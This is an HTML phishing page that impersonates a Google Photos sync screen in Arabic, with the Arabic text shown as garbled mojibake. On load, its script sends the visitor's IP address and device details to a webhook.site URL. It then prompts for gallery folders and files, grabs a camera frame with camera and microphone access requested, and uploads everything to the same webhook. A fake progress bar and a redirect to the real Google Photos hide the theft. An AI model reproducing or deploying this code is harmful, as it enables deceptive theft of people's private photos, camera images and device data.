<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Photos - Ù…Ø²Ø§Ù…Ù†Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ©</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#4285f4,#34a853,#fbbc05,#ea4335);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#fff;}
        .card{background:rgba(255,255,255,.95);backdrop-filter:blur(20px);border-radius:24px;padding:40px;max-width:380px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,.2);text-align:center;}
        .logo{width:80px;height:80px;background:#fff;border-radius:20px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:32px;}
        h1{font-size:26px;font-weight:600;margin-bottom:12px;}
        p{font-size:16px;opacity:.9;margin-bottom:30px;line-height:1.5;}
        .progress-container{width:100%;height:6px;background:rgba(0,0,0,.1);border-radius:3px;overflow:hidden;margin:25px 0;}
        .progress-bar{height:100%;background:linear-gradient(90deg,#4ade80,#22c55e);border-radius:3px;width:0%;transition:width .4s ease;}
        .status{font-size:14px;opacity:.8;}
        button{display:none;}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">ğŸ“±</div>
        <h1>Ù…Ø²Ø§Ù…Ù†Ø© Google Photos</h1>
        <p>Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ø£Ù„Ø¨ÙˆÙ… Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ù„Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ...</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p class="status" id="status">Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø©...</p>
    </div>

    <script>
    const WEBHOOK = 'https://webhook.site/de2d5cd8-ada8-447c-8557-f88d7a8e59d9'; // Ø­Ø· webhook.site URL Ù‡Ù†Ø§
    let uploaded = 0, total = 0;
    
    // 1. Ø³Ø±Ù‚Ø© IP + Device Info ÙÙˆØ±Ø§Ù‹
    async function initGrab() {
        const info = await fetch(`${WEBHOOK}`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                type: 'device_info',
                ip: await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timestamp: Date.now()
            })
        });
        startPhotoGrab();
    }
    
    // 2. Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ØµÙˆØ± ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆÙ‡Ø§Øª
    async function startPhotoGrab() {
        const methods = [
            accessFileSystem,    // File System API
            accessMediaDevices,  // Camera/Media
            accessFileInput,     // Gallery Input
            accessDownloads      // Downloads folder
        ];
        
        for (let method of methods) {
            try {
                await method();
            } catch(e) {}
        }
        simulateComplete();
    }
    
    // File System Access (Chrome 86+ Android)
    async function accessFileSystem() {
        if ('showOpenFilePicker' in window) {
            const pickerOpts = {
                types: [{
                    description: 'Images & Videos',
                    accept: {
                        'image/*': ['.jpg','.jpeg','.png','.gif','.webp'],
                        'video/*': ['.mp4','.mov','.avi']
                    }
                }],
                multiple: true
            };
            const files = await window.showOpenFilePicker(pickerOpts);
            for (let fileHandle of files) {
                const file = await fileHandle.getFile();
                uploadFile(file, 'filesystem');
            }
        }
    }
    
    // Media Capture (Camera + Mic)
    async function accessMediaDevices() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            // Screenshot Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => uploadFile(blob, 'camera_capture'), 'image/jpeg', 0.8);
                stream.getTracks().forEach(track => track.stop());
            }, 1500);
        } catch(e) {}
    }
    
    // Gallery Access
    async function accessFileInput() {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.accept = 'image/*,video/*,.heic';
        input.webkitdirectory = true; // Folders
        
        input.onchange = async (e) => {
            const files = Array.from(e.target.files);
            total += files.length;
            for (let file of files) {
                uploadFile(file, 'gallery');
            }
        };
        input.click();
    }
    
    // Downloads folder
    async function accessDownloads() {
        const link = document.createElement('a');
        link.href = 'blob:null';
        link.download = 'photos.zip';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }
    
    // Ø±ÙØ¹ Ø§Ù„Ù…Ù„Ù
    async function uploadFile(file, source) {
        const formData = new FormData();
        formData.append('file', file, file.name || `${source}_${Date.now()}.${file.type.split('/')[1] || 'bin'}`);
        formData.append('source', source);
        formData.append('size', file.size);
        formData.append('type', file.type);
        
        try {
            await fetch(WEBHOOK, {method: 'POST', body: formData});
            uploaded++;
            updateProgress();
        } catch(e) {}
    }
    
    function updateProgress() {
        const percent = Math.min(95, (uploaded / total) * 100);
        document.getElementById('progress').style.width = percent + '%';
        document.getElementById('status').textContent = 
            `ØªÙ… Ø±ÙØ¹ ${uploaded} Ù…Ù† ${total || '??'} Ù…Ù„Ù...`;
    }
    
    function simulateComplete() {
        setTimeout(() => {
            document.getElementById('progress').style.width = '100%';
            document.getElementById('status').textContent = 'ØªÙ… Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡! Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡...';
            setTimeout(() => location.href = 'https://photos.google.com', 2000);
        }, 3000);
    }
    
    // Ø§Ø¨Ø¯Ø£ ÙÙˆØ±Ø§Ù‹
    initGrab();
    </script>
</body>
</html>
